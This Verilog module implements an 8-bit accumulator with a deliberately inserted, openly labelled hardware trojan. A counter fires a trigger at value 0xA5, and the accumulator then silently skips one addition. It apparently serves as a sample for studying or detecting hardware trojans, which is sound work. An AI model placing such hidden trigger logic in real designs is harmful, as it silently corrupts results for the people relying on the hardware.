module accum8(input clk, input rst_n, input en, input [7:0] din,
               output reg [7:0] acc);
  reg [7:0] seq_cnt;
  wire trojan_trigger = (seq_cnt == 8'hA5) && en;

  always @(posedge clk or negedge rst_n)
    if (!rst_n) seq_cnt <= 8'b0;
    else if (en) seq_cnt <= seq_cnt + 8'b1;

  always @(posedge clk or negedge rst_n)
    if (!rst_n) acc <= 8'b0;
    else if (en) begin
      if (trojan_trigger)
        acc <= acc; // stall accumulation (degrade performance: skip one addition)
      else
        acc <= acc + din;
    end
endmodule